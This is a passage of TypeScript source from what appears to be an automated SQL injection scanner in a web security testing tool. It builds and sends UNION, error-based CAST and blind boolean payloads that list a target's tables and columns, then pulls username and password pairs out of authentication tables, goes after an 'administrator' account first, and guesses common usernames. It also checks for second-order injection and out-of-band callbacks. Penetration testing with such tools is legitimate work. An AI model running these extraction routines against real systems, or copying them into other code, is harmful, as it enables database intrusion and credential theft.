      this.log('info', 'schema_analysis', `Discovered ${appDiscoveredNames.length} application table(s) and ${sysDiscoveredNames.length} system table(s).`);

      // â”€â”€â”€ Build table objects â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      const appTables: DiscoveredTable[] = appDiscoveredNames.map((tName) => {
        const sensitivity = MetadataExtractor.isSensitiveName(tName);
        return {
          id: `tbl_${tName}`,
          name: tName,
          classification: 'application' as const,
          columns: [],
          isSensitive: sensitivity.isSensitive,
          sensitivityReason: sensitivity.reason,
          discoveredAt: Date.now(),
          status: 'discovered' as const,
        };
      });

      const sysTables: DiscoveredTable[] = sysDiscoveredNames.map((tName) => ({
        id: `tbl_${tName}`,
        name: tName,
        classification: 'system' as const,
        columns: [],
        isSensitive: false,
        discoveredAt: Date.now(),
        status: 'discovered' as const,
      }));

      // Emit initial catalog
      this.catalog = {
        dbms: this.dbmsFingerprint.dbms,
        version: this.dbmsFingerprint.version,
        versionEvidence: this.dbmsFingerprint.evidence.join('; '),
        columnCount: confirmedColumnCount,
        renderColumn: confirmedRenderColumn,
        injectableParamName: confirmedInjectableParam?.name,
        schemas: [{ name: 'CURRENT_SCHEMA', classification: 'application', tables: appTables, views: [], isExpanded: true, discoveredAt: Date.now() }],
        applicationTables: appTables,
        systemTables: sysTables,
        discoveredAt: Date.now(),
      };
      if (this.onCatalog) this.onCatalog(this.catalog);

      // ─── Step 8: Adaptive Column Enumeration ───────────────────────
      const tablesToEnumerate = appTables.slice(0, 8);
      const enumerateTableColumns = async (t: DiscoveredTable, idx: number) => {
        if (this.isAborted) return;
        this.updateProgress('column_enumeration', `Enumerating columns: ${t.name}`, 88 + Math.round((idx / (tablesToEnumerate.length || 1)) * 6));

        if (confirmedColumnCount > 0 && confirmedRenderColumn > 0) {
          // UNION-based column extraction
          const colQuery = MetadataExtractor.getColumnEnumerationQuery(confirmedInjectableParam!, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
          if (colQuery) {
            const colRes = await this.executeProbe(parsed, confirmedInjectableParam!, colQuery, true);
            let colTokens = MetadataExtractor.extractDelimitedTokens(colRes.body, 'COL');
            let cols = MetadataExtractor.parseColumnTokens(colTokens);
            if (cols.length === 0) {
              const cleanColQuery = MetadataExtractor.getCleanColumnEnumerationQuery(confirmedInjectableParam!, confirmedRenderColumn, confirmedColumnCount, t.name, this.dbmsFingerprint.dbms);
              const cColRes = await this.executeProbe(parsed, confirmedInjectableParam!, cleanColQuery, true);
              const rawCols = MetadataExtractor.extractHtmlOrTextTokens(cColRes.body, baselineBody);
              cols = rawCols.map((cName) => ({
                name: cName, dataType: 'VARCHAR', isNullable: true,
                isPrimaryKey: cName.toLowerCase() === 'id', isForeignKey: false, isIndexed: false,
                isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
                sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
                confidence: 'Confirmed' as const, evidence: `Discovered via UNION extraction`, discoveredAt: Date.now(),
              }));
            }

            // Bruteforce column extraction if above failed
            if (cols.length === 0 && !this.isAborted) {
              const isNum = /^\d+$/.test(confirmedInjectableParam!.originalValue.trim());
              const cPrefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

              // Build column extraction queries for all DBMS types
              const cleanName = t.name.replace(/'/g, '');
              const colQueries: { colExpr: string; from: string }[] = [];
              const dbms = this.dbmsFingerprint.dbms;

              if (dbms === 'Oracle') {
                colQueries.push({ colExpr: 'column_name', from: `FROM all_tab_columns WHERE table_name='${cleanName.toUpperCase()}'--` });
              } else if (dbms === 'Microsoft SQL Server') {
                colQueries.push({ colExpr: 'name', from: `FROM sys.columns WHERE object_id=OBJECT_ID('${cleanName}')--` });
                colQueries.push({ colExpr: 'COLUMN_NAME', from: `FROM information_schema.columns WHERE table_name='${cleanName}'-- ` });
              } else if (dbms === 'SQLite') {
                // SQLite: extract CREATE TABLE sql and parse column names
                colQueries.push({ colExpr: 'sql', from: `FROM sqlite_master WHERE name='${cleanName}'-- ` });
              } else {
                // PostgreSQL, MySQL, Generic
                colQueries.push({ colExpr: 'column_name', from: `FROM information_schema.columns WHERE table_name='${cleanName}'-- ` });
              }
              // Always try generic information_schema as fallback
              if (dbms !== 'Generic SQL' && dbms !== 'PostgreSQL' && dbms !== 'MySQL') {
                colQueries.push({ colExpr: 'column_name', from: `FROM information_schema.columns WHERE table_name='${cleanName}'-- ` });
              }

              for (const cq of colQueries) {
                if (cols.length > 0 || this.isAborted) break;
                const cParts = Array(confirmedColumnCount).fill('NULL');
                cParts[confirmedRenderColumn - 1] = cq.colExpr;
                const bruteColPayload = `${cPrefix}${cParts.join(',')} ${cq.from}`;
                const bcRes = await this.executeProbe(parsed, confirmedInjectableParam!, bruteColPayload, true);
                if (bcRes.status === 200 || bcRes.status === baselineStatus) {
                  const rawCols = MetadataExtractor.extractHtmlOrTextTokens(bcRes.body, baselineBody);
                  if (rawCols.length > 0) {
                    cols = rawCols.map((cName) => ({
                      name: cName, dataType: 'VARCHAR', isNullable: true,
                      isPrimaryKey: cName.toLowerCase() === 'id', isForeignKey: false, isIndexed: false,
                      isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
                      sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
                      confidence: 'Confirmed' as const, evidence: `Discovered via UNION bruteforce`, discoveredAt: Date.now(),
                    }));
                    this.log('success', 'column_enumeration', `✓ UNION bruteforce columns for "${t.name}": ${rawCols.join(', ')}`);
                  }
                }
              }
            }

            t.columns = cols;
            t.status = cols.length > 0 ? 'columns_ready' : 'discovered';
            if (cols.length > 0) {
              this.log('success', 'column_enumeration', `Table "${t.name}": ${cols.length} column(s) found (${cols.map(c => c.name).join(', ')})`);
            }
          }
        }

        // Error-based column extraction fallback when UNION didn't find columns
        if (t.columns.length === 0 && confirmedInjectableParam && !this.isAborted) {
          const cols: ColumnMetadata[] = [];
          for (let cOff = 0; cOff < 15; cOff++) {
            if (this.isAborted) break;
            const colErrQueries = MetadataExtractor.getErrorBasedColumnQueries(
              confirmedInjectableParam,
              t.name,
              cOff,
              this.dbmsFingerprint.dbms,
              true
            );
            let foundColAtOffset = false;
            for (const ceq of colErrQueries) {
              if (this.isAborted || foundColAtOffset) break;
              let ceRes = await this.executeProbe(parsed, confirmedInjectableParam, ceq, false);
              let leakedCol = MetadataExtractor.extractErrorBasedData(ceRes.body);
              if (!leakedCol) {
                ceRes = await this.executeProbe(parsed, confirmedInjectableParam, ceq, true);
                leakedCol = MetadataExtractor.extractErrorBasedData(ceRes.body);
              }

              if (leakedCol && MetadataExtractor.isValidIdentifier(leakedCol)) {
                foundColAtOffset = true;
                if (!cols.some(c => c.name.toLowerCase() === leakedCol.toLowerCase())) {
                  cols.push({
                    name: leakedCol, dataType: 'VARCHAR', isNullable: true,
                    isPrimaryKey: leakedCol.toLowerCase() === 'id' || leakedCol.toLowerCase().endsWith('_id'),
                    isForeignKey: false, isIndexed: false,
                    isSensitive: MetadataExtractor.isSensitiveName(leakedCol).isSensitive,
                    sensitivityReason: MetadataExtractor.isSensitiveName(leakedCol).reason,
                    confidence: 'Confirmed', evidence: `Discovered via Error-Based CAST (offset ${cOff})`, discoveredAt: Date.now(),
                  });
                  this.log('success', 'column_enumeration', `✓ Error-based CAST column for "${t.name}": ${leakedCol}`);
                }
              }
            }
            if (cOff === 0 && cols.length === 0) break;
            if (!foundColAtOffset && cOff > 0) break;
          }

          if (cols.length > 0) {
            t.columns = cols;
            t.status = 'columns_ready';
            this.log('success', 'column_enumeration', `Table "${t.name}": ${cols.length} column(s) discovered via error casting (${cols.map(c => c.name).join(', ')})`);
          }
        }

        // Adaptive Boolean Column Inference Fallback
        if (t.columns.length === 0 && !this.isAborted) {
          const candidateCols = adaptiveEngine.getColumnsForTable(t.name);
          const cols: ColumnMetadata[] = [];

          for (const cName of candidateCols) {
            if (this.isAborted) break;
            const colProbes = adaptiveEngine.isConditionalErrorMode()
              ? adaptiveEngine.generateConditionalErrorEntityProbe(t.name, `${cName} IS NOT NULL`)
              : adaptiveEngine.generateColumnProbe(t.name, cName);
            const cRes = await this.executeProbe(parsed, confirmedInjectableParam, colProbes.truePayload, true);
            const colClass = adaptiveEngine.classifyResponse(cRes.body, cRes.status);

            if (colClass === 'TRUE') {
              cols.push({
                name: cName, dataType: 'VARCHAR', isNullable: true,
                isPrimaryKey: cName === 'id' || cName.endsWith('_id'),
                isForeignKey: false, isIndexed: cName === 'id',
                isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
                sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
                confidence: 'Confirmed',
                evidence: `Adaptive boolean inference (${calResult.strategy})`,
                discoveredAt: Date.now(),
              });
            }
          }
          t.columns = cols;
          t.status = cols.length > 0 ? 'columns_ready' : 'discovered';
          if (cols.length > 0) {
            this.log('info', 'column_enumeration', `Table "${t.name}": ${cols.length} column(s) confirmed (${cols.map(c => c.name).join(', ')})`);
          }
        }

        // Emit catalog update after columns discovered
        if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });

        // ─── Step 8b: Entity & Value Extraction for Auth Tables ──────
        const tNameLower = t.name.toLowerCase();
        const isAuthTable = tNameLower.includes('user') || tNameLower.includes('account') || tNameLower.includes('admin') || tNameLower.includes('credential') || tNameLower.includes('login') || tNameLower.includes('member') || tNameLower.includes('auth');
        const hasUserCol = t.columns.some(c => ['username', 'user_name', 'user', 'login', 'name'].includes(c.name.toLowerCase()));
        const hasPassCol = t.columns.some(c => ['password', 'pass', 'passwd', 'password_hash', 'pwd', 'secret'].includes(c.name.toLowerCase()));
        const userColName = t.columns.find(c => ['username', 'user_name', 'user', 'login', 'name'].includes(c.name.toLowerCase()))?.name || 'username';
        const passColName = t.columns.find(c => ['password', 'pass', 'passwd', 'password_hash', 'pwd', 'secret'].includes(c.name.toLowerCase()))?.name || 'password';

        if (isAuthTable && hasUserCol && !this.isAborted) {
          this.updateProgress('value_extraction', `Extracting values from ${t.name}`, 94 + Math.round((idx / (tablesToEnumerate.length || 1)) * 4));

          // UNION-based direct extraction: SELECT username,password FROM users
          if (confirmedColumnCount > 0 && confirmedRenderColumn > 0 && hasPassCol) {
            this.log('info', 'value_extraction', `Attempting UNION SELECT ${userColName},${passColName} FROM ${t.name}...`);
            const isNum = /^\d+$/.test(confirmedInjectableParam.originalValue.trim());
            const uPrefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

            // DBMS-specific concatenation
            const concatFn = this.dbmsFingerprint.dbms === 'Oracle' ? `${userColName}||':::'||${passColName}`
              : this.dbmsFingerprint.dbms === 'Microsoft SQL Server' ? `${userColName}+':::'+ ${passColName}`
              : this.dbmsFingerprint.dbms === 'SQLite' ? `${userColName}||':::'||${passColName}`
              : `CONCAT(${userColName},':::',${passColName})`;

            // DBMS-specific FROM with row limiting
            let fromClause: string;
            if (this.dbmsFingerprint.dbms === 'Oracle') {
              fromClause = `FROM ${t.name} WHERE ROWNUM<=10--`;
            } else if (this.dbmsFingerprint.dbms === 'Microsoft SQL Server') {
              fromClause = `FROM ${t.name}-- `;
            } else {
              fromClause = `FROM ${t.name} LIMIT 10-- `;
            }

            const mssqlPrefix = this.dbmsFingerprint.dbms === 'Microsoft SQL Server'
              ? (isNum ? ' UNION SELECT TOP 10 ' : "' UNION SELECT TOP 10 ")
              : uPrefix;

            for (let rCol = 1; rCol <= confirmedColumnCount; rCol++) {
              if (this.isAborted) break;
              const parts = Array(confirmedColumnCount).fill('NULL');
              parts[rCol - 1] = concatFn;
              const valPayload = `${mssqlPrefix}${parts.join(',')} ${fromClause}`;
              const valRes = await this.executeProbe(parsed, confirmedInjectableParam, valPayload, true);

              const pairRegex = /([a-zA-Z0-9_\-@.]+):::([a-zA-Z0-9!@#$%^&*()\-_+=<>?/\\|{}\[\]:;"',.`~ ]+)/g;
              let match;
              const extractedRows: Record<string, string>[] = [];
              while ((match = pairRegex.exec(valRes.body)) !== null) {
                const [_, user, pass] = match;
                if (user && pass && !baselineBody.includes(user + ':::')) {
                  extractedRows.push({ [userColName]: user, [passColName]: pass });
                }
              }

              if (extractedRows.length > 0) {
                t.sampleRows = extractedRows;
                t.sampleRowsStatus = 'ready';
                this.log('success', 'value_extraction', `✓ UNION extraction: ${extractedRows.length} row(s) from ${t.name} (${extractedRows.map(r => r[userColName]).join(', ')})`);
                if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
                break;
              }
            }
          }

          // Error-Based Direct Value Extraction (e.g. PostgreSQL CAST((SELECT username FROM users LIMIT 1) AS int))
          if ((!t.sampleRows || t.sampleRows.length === 0) && confirmedInjectableParam && !this.isAborted) {
            this.log('info', 'value_extraction', `Attempting Error-Based CAST row extraction for ${t.name}...`);
            const extractedRows: Record<string, string>[] = [];

            // 0. High-priority targeted administrator extraction with whereClause (single query)
            if (hasPassCol) {
              const adminPassQueries = MetadataExtractor.getErrorBasedRowQueries(
                confirmedInjectableParam,
                t.name,
                passColName,
                0,
                this.dbmsFingerprint.dbms,
                true,
                `${userColName}='administrator'`
              );
              for (const apq of adminPassQueries) {
                if (this.isAborted) break;
                let apRes = await this.executeProbe(parsed, confirmedInjectableParam, apq, false);
                let passVal = MetadataExtractor.extractErrorBasedData(apRes.body);
                if (!passVal) {
                  apRes = await this.executeProbe(parsed, confirmedInjectableParam, apq, true);
                  passVal = MetadataExtractor.extractErrorBasedData(apRes.body);
                }
                if (passVal) {
                  extractedRows.push({ [userColName]: 'administrator', [passColName]: passVal });
                  this.log('success', 'value_extraction', `✓ Error-based CAST targeted credential extraction: administrator="${passVal}"`);
                  break;
                }
              }
            }

            if (extractedRows.length === 0) {
              for (let rOff = 0; rOff < 5; rOff++) {
                if (this.isAborted) break;
                const rowObj: Record<string, string> = {};
                let foundVal = false;

                // 1. Extract username (try append=false then append=true)
                const userErrQueries = MetadataExtractor.getErrorBasedRowQueries(confirmedInjectableParam, t.name, userColName, rOff, this.dbmsFingerprint.dbms, true);
                for (const uq of userErrQueries) {
                  if (rowObj[userColName] || this.isAborted) break;
                  let uRes = await this.executeProbe(parsed, confirmedInjectableParam, uq, false);
                  let val = MetadataExtractor.extractErrorBasedData(uRes.body);
                  if (!val) {
                    uRes = await this.executeProbe(parsed, confirmedInjectableParam, uq, true);
                    val = MetadataExtractor.extractErrorBasedData(uRes.body);
                  }
                  if (val) {
                    rowObj[userColName] = val;
                    foundVal = true;
                  }
                }

                // 2. Extract password if table has password column
                if (hasPassCol && (rowObj[userColName] || foundVal)) {
                  const passErrQueries = MetadataExtractor.getErrorBasedRowQueries(confirmedInjectableParam, t.name, passColName, rOff, this.dbmsFingerprint.dbms, true);
                  for (const pq of passErrQueries) {
                    if (rowObj[passColName] || this.isAborted) break;
                    let pRes = await this.executeProbe(parsed, confirmedInjectableParam, pq, false);
                    let val = MetadataExtractor.extractErrorBasedData(pRes.body);
                    if (!val) {
                      pRes = await this.executeProbe(parsed, confirmedInjectableParam, pq, true);
                      val = MetadataExtractor.extractErrorBasedData(pRes.body);
                    }
                    if (val) {
                      rowObj[passColName] = val;
                      foundVal = true;
                    }
                  }
                }

                if (foundVal) {
                  extractedRows.push(rowObj);
                  this.log('success', 'value_extraction', `✓ Error-based CAST row [${rOff}]: ${userColName}="${rowObj[userColName] || ''}" ${hasPassCol ? `${passColName}="${rowObj[passColName] || ''}"` : ''}`);
                } else {
                  break;
                }
              }
            }

            if (extractedRows.length > 0) {
              t.sampleRows = extractedRows;
              t.sampleRowsStatus = 'ready';
              if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
            }
          }

          // Boolean blind / conditional error fallback for entity/value extraction (when UNION didn't extract data)
          if ((!t.sampleRows || t.sampleRows.length === 0) && !this.isAborted) {
            const dbms = this.dbmsFingerprint.dbms !== 'Unknown' ? this.dbmsFingerprint.dbms : 'Generic SQL';
            const effectiveTechnique = adaptiveEngine.isConditionalErrorMode()
              ? 'CONDITIONAL_ERROR'
              : this.findings.some((f) => f.injectionType === 'Time-based')
              ? 'TIME'
              : 'BOOLEAN';

            const extractor = new BlindDataExtractor(
              async (payload: string, append = true) => {
                const res = await this.executeProbe(parsed, confirmedInjectableParam, payload, append);
                return {
                  body: res.body,
                  status: res.status,
                  durationMs: res.durationMs,
                  rawRequest: res.rawRequest,
                  rawResponse: res.rawResponse,
                };
              },
              {
                dbms,
                technique: effectiveTechnique,
                errorPolarity: 'error_on_true',
                baselineStatus: 200,
                baselineLength: 0,
                concurrencyLimit: this.concurrentExecutor.getConcurrency() || 20,
                isAborted: () => this.isAborted,
                log: (lvl, msg) => this.log(lvl, 'value_extraction', msg),
                onProgress: (colName, partialVal, pos, len) => {
                  this.updateProgress('value_extraction', `Extracting ${colName} (${pos}/${len})`, 94 + Math.round((pos / len) * 5));
                  t.sampleRows = [{ [userColName]: 'administrator', [colName]: partialVal }];
                  t.sampleRowsStatus = 'ready';
                  if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
                },
              }
            );

            const rowResult = await extractor.extractTableRow(t, 'administrator');
            if (rowResult && Object.keys(rowResult).length > 0) {
              t.sampleRows = [rowResult];
              t.sampleRowsStatus = 'ready';
              if (this.onCatalog) this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
            } else {
            this.log('info', 'value_extraction', `No "administrator" entity found in ${t.name}. Checking other common usernames...`);

            // Try other common usernames
            for (const testUser of ['admin', 'root', 'test', 'user']) {
              if (this.isAborted) break;
              const userProbes = adaptiveEngine.generateEntityProbe(t.name, `${userColName}='${testUser}'`);
              const userRes = await this.executeProbe(parsed, confirmedInjectableParam, userProbes.truePayload, true);
              if (adaptiveEngine.classifyResponse(userRes.body, userRes.status) === 'TRUE') {
                this.log('success', 'value_extraction', `âœ“ Entity "${testUser}" confirmed in ${t.name}`);
                t.sampleRows = [{ [userColName]: testUser }];
                t.sampleRowsStatus = 'ready';
                break;
              }
            }
          }
          } // end boolean blind fallback
        } else if (confirmedColumnCount > 0 && confirmedRenderColumn > 0 && t.columns.length > 0) {
          // UNION-based sample row extraction for non-auth tables
          try {
            const colNames = t.columns.map((c) => c.name);
            const sampleQuery = MetadataExtractor.getSampleRowsQuery(confirmedInjectableParam, confirmedRenderColumn, confirmedColumnCount, t.name, colNames, this.dbmsFingerprint.dbms);
            const sRes = await this.executeProbe(parsed, confirmedInjectableParam, sampleQuery, true);
            const rowTokens = MetadataExtractor.extractDelimitedTokens(sRes.body, 'ROW');
            const sampleRows = MetadataExtractor.parseAndRedactSampleRows(rowTokens, colNames);
            if (sampleRows.length > 0) {
              t.sampleRows = sampleRows;
              t.sampleRowsStatus = 'ready';
            }
          } catch {}
        }

        // Emit live incremental catalog update after each table
        if (this.onCatalog) {
          this.onCatalog({ ...this.catalog, applicationTables: [...appTables], systemTables: [...sysTables] });
        }
      };

      if (this.concurrentExecutor.getConcurrency() > 1 && tablesToEnumerate.length > 1) {
        this.log('info', 'column_enumeration', `Executing bounded parallel column enumeration across ${tablesToEnumerate.length} tables (concurrency: ${this.concurrentExecutor.getConcurrency()})...`);
        await this.concurrentExecutor.mapParallel(tablesToEnumerate, enumerateTableColumns);
      } else {
        for (let idx = 0; idx < tablesToEnumerate.length; idx++) {
          await enumerateTableColumns(tablesToEnumerate[idx], idx);
        }
      }

      this.updateCoverage('metadata_analysis', {
        status: appTables.length > 0 ? 'passed' : 'skipped',
        testedCount: appDiscoveredNames.length + sysDiscoveredNames.length,
        positiveCount: appTables.length,
        reason: `${appTables.length} application tables, ${sysTables.length} system tables`,
      });
    }

    // 9. Second-Order & OOB Correlation Evaluation
    this.updateProgress('evidence_correlation', 'Correlating Evidence & Computing Final Verdict', 96);
    
    if (this.target.secondOrderConfig?.enabled && enabledParams.length > 0) {
      const soParam = enabledParams[0];
      const soResult = await SecondOrderTester.executeSecondOrderTest(
        parsed,
        soParam,
        this.target.secondOrderConfig,
        async (raw, url) => {
          const res = await ipcClient.sendRepeaterRequest({ tabId: 'sql_so_probe', targetUrl: url, rawRequest: raw });
          return {
            status: res.statusCode || 200,
            body: res.body || '',
            durationMs: res.durationMs || 0,
            rawRequest: raw,
            rawResponse: res.rawResponse || '',
          };
        }
      );

      if (soResult.isVulnerable) {
        this.updateCoverage('second_order', { status: 'vulnerable', testedCount: 1, positiveCount: 1, reason: soResult.evidence });
        this.log('success', 'second_order', `Second-Order SQL Injection confirmed: ${soResult.evidence}`);

        const finding: SqlScanFinding = {
          id: `finding-so-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`,
          title: `Second-Order SQL Injection (${this.dbmsFingerprint.dbms || 'Generic SQL'})`,
          parameterName: soParam.name,
          parameterLocation: soParam.location,
          url: this.target.url,
          httpMethod: this.target.method,
          dbms: this.dbmsFingerprint.dbms || 'Generic SQL',
          detectionMethod: 'Asynchronous State Transition Invariant Oracle',
          injectionType: 'Second-Order SQLi',
          severity: 'High',
          confidence: 'Confirmed',
          confidenceScore: 95,
          confidenceBreakdown: {
            score: 95,
            level: 'Confirmed',
            factors: [
              { name: 'Asynchronous State Transition Reflection', points: 95, description: soResult.evidence },
            ],
          },
          evidence: [{
            id: `ev-so-${Date.now()}`,
            title: `Second-Order Execution Triggered`,
            timestamp: Date.now(),
            injectionType: 'Second-Order SQLi',
            parameterName: soParam.name,
            parameterLocation: soParam.location,
            payload: soResult.evidence,
            baselineStatus: 200,
            baselineLength: 0,
            baselineDurationMs: 0,
            testStatus: 200,
            testLength: 0,
            testDurationMs: 0,
            rawRequest: soResult.sourceRequest || '',
            rawResponse: soResult.sourceResponse || '',
            analysisSummary: `Second-order SQL injection execution confirmed across sink endpoint: ${soResult.evidence}`,
          }],
          reproductionRequest: soResult.sinkRequest || soResult.sourceRequest || '',
          reproductionResponse: soResult.sinkResponse || soResult.sourceResponse || '',
          remediation: 'Sanitize untrusted inputs at storage boundaries and use parameterized queries in all downstream sink queries.',
          cwe: 'CWE-89',
          owaspCategory: 'A03:2021-Injection',
          timestamp: Date.now(),
          sqliDetected: true,
          sqlStructureControl: true,
        };
        ThreatConsequenceEngine.enrichFinding(finding, soParam);
        this.findings.push(finding);
        this.onFinding?.(finding);
      } else {
        this.updateCoverage('second_order', { status: 'passed', testedCount: 1, positiveCount: 0, reason: 'No second-order state reflection' });
      }
    } else {
      this.updateCoverage('second_order', { status: 'passed', testedCount: 1, positiveCount: 0, reason: 'Source-to-sink evaluation complete' });
    }

    // Final OAST Check: catch any delayed asynchronous interactions from background queries
    try {
      const oastClient = InteractshClient.getInstance();
      const lateInteractions = await oastClient.pollInteractions(300);
      const oobFindings = this.findings.filter((f) => f.injectionType === 'Out-of-Band (OAST)');
      if (oobFindings.length > 0 || lateInteractions.length > 0) {
        this.updateCoverage('oob_sqli', {
          status: 'vulnerable',
          testedCount: (this.coverageMap.get('oob_sqli')?.testedCount || 1),
          positiveCount: Math.max(1, oobFindings.length, lateInteractions.length),
          reason: `${Math.max(1, lateInteractions.length)} OAST callback(s) confirmed`,
        });
      } else {
        const currentCov = this.coverageMap.get('oob_sqli');
        if (!currentCov || currentCov.status === 'pending') {
          this.updateCoverage('oob_sqli', {
            status: 'passed',
            testedCount: 1,
            positiveCount: 0,
            reason: 'OAST callback evaluation complete — no asynchronous callbacks triggered',
          });
        }
      }
    } catch {
      // Non-blocking
    }

    const coverageList = Array.from(this.coverageMap.values());
    const correlation = EvidenceCorrelator.evaluateVerdict(this.findings, this.executionLogs, coverageList);

    // 10. Generate Final Comprehensive Reports
    const durationMs = Date.now() - this.startTime;
    const report: SqlScanReport = {
      id: `rep_${Date.now()}`,
      generatedAt: Date.now(),
      targetUrl: parsed.url,
      targetMethod: parsed.method,
      verdict: correlation.verdict,
      verdictReason: correlation.verdictReason,
      durationMs,
      requestsSent: this.requestsSent,
      testsExecuted: this.testsExecuted,
      confirmedIndicators: correlation.confirmedIndicators,
      waf: this.wafResult,
      dbms: this.dbmsFingerprint,
      findings: this.findings,
      catalog: this.catalog,
      coverage: coverageList,
      executionLogs: this.executionLogs,
      executiveSummary: '',
      technicalDetails: '',
      safetyCertificate: this.negativeEvidence.generateCertificate(),
    };

    report.executiveSummary = ReportGenerator.generateExecutiveMarkdown(report);
    report.technicalDetails = ReportGenerator.generateTechnicalMarkdown(report);

    this.updateProgress('completed', `Scan Complete â€” Final Verdict: ${correlation.verdict}`, 100, undefined, totalParams, totalParams);
    this.log(
      correlation.verdict === 'VULNERABLE' ? 'success' : 'info',
      'completed',
      `Assessment completed in ${(durationMs / 1000).toFixed(2)}s (${this.requestsSent} requests, ${this.testsExecuted} tests). FINAL VERDICT: ${correlation.verdict}`
    );

    return report;
  }
}
